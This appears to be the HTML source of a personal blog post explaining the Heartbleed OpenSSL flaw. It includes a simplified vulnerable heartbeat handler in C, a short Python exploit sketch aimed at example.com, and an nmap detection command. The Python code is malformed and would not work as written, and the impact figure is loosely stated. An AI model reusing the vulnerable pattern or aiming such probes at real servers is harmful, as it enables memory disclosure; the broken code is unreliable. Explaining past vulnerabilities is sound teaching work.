@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Heartbleed (CVE-2014–0160)</title>
+
+  <!-- Link to the common style for light/dark mode -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="dark">
+
+  <!-- NAVBAR -->
+  <nav class="navbar">
+    <div class="container nav-container">
+      <div class="logo">Hem Parekh's Blog</div>
+      <ul class="nav-links">
+        <li><a href="index.html#home">Home</a></li>
+        <li><a href="index.html#about">About</a></li>
+        <li><a href="index.html#experience">Experience</a></li>
+        <li><a href="index.html#projects">Projects</a></li>
+        <li><a href="blogs.html" class="active">Blog</a></li>
+      </ul>
+      <!-- Theme Toggle Button -->
+      <button class="theme-toggle" id="themeToggle">Light Mode</button>
+    </div>
+  </nav>
+
+  <!-- BLOG POST HEADER -->
+  <header class="blog-post-header">
+    <div class="container">
+      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
+      <p class="blog-post-date">Published on: December 24, 2024</p>
+    </div>
+  </header>
+
+  <!-- BLOG POST CONTENT -->
+  <section class="blog-post-content">
+    <div class="container">
+      <div class="blog-text">
+        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
+        <p>
+          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
+        </p>
+
+        <h3>Heartbeat Extension Basics</h3>
+        <p>
+          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
+        </p>
+        <ol>
+          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
+          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
+        </ol>
+        <p>
+          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
+        </p>
+
+        <h3>Simplified Vulnerable Code</h3>
+        <div class="code-block">
+          <code>
+int tls1_process_heartbeat(SSL *s) {<br />
+&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
+&nbsp;&nbsp;unsigned short payload;<br />
+&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
+&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
+&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
+&nbsp;&nbsp;bp = buffer;<br />
+&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
+&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
+&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
+&nbsp;&nbsp;OPENSSL_free(buffer);<br />
+}
+          </code>
+        </div>
+
+        <h2>How Heartbleed Works</h2>
+        <p>
+          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
+        </p>
+
+        <h3>Exploit Example in Python</h3>
+        <div class="code-block">
+          <code>
+import socket<br />
+import struct<br />
+def create_heartbeat_request():<br />
+&nbsp;&nbsp;hb_type = 1<br />
+&nbsp;&nbsp;payload = b"Hi"<br />
+&nbsp;&nbsp;payload_length = 0xFFFF<br />
+&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
+def send_heartbeat_request(host, port):<br />
+&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
+&nbsp;&nbsp;s.connect((host, port))<br />
+&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
+&nbsp;&nbsp;response = s.recv(65535)<br />
+&nbsp;&nbsp;print("Leaked memory:", response)<br />
+send_heartbeat_request("example.com", 443)
+          </code>
+        </div>
+
+        <h2>Global Chaos and Real-World Impact</h2>
+        <p>
+          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
+        </p>
+
+        <h2>Detecting Heartbleed</h2>
+        <p>
+          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
+        </p>
+        <div class="code-block">
+          <code>
+nmap -p 443 --script ssl-heartbleed example.com
+          </code>
+        </div>
+
+        <h2>Lessons Learned</h2>
+        <ul>
+          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
+          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
+          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
+    </div>
+  </footer>
+
+  <!-- Link to JS for theme toggle -->
+  <script src="script.js"></script>
+</body>
+</html>
